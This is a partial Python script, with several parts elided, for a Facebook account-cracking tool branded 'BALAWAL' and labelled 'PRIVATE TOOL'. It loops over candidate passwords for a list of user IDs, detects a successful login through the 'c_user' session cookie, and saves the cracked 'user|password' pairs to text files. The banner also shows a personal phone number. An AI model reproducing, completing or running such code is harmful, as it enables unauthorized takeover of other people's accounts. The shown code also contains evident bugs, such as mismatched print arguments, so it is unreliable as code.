...
\033[1;35m💙💘✨____________💞💕❣️____________💘💝💕💓
  ...
  Auther   : BALAWAL 
  \033[1;37mFacebook : balawal.saleem.3
 \033[1;37mNote     : PRIVATE TOOL
    \033[1;37mVersion  : 0.3
    \033[1;35mWhatsapp: 03154583168
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mBalawal_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mBalawal_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back BALAWAL Menu ")
	    mr()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[BALAWAL] {loop}|{len(self.id)} \033[1;32m[ok][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [BALAWAL-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('BALAWAL_CP.txt' , 'a').write('%s\n' % wrt)
                        break
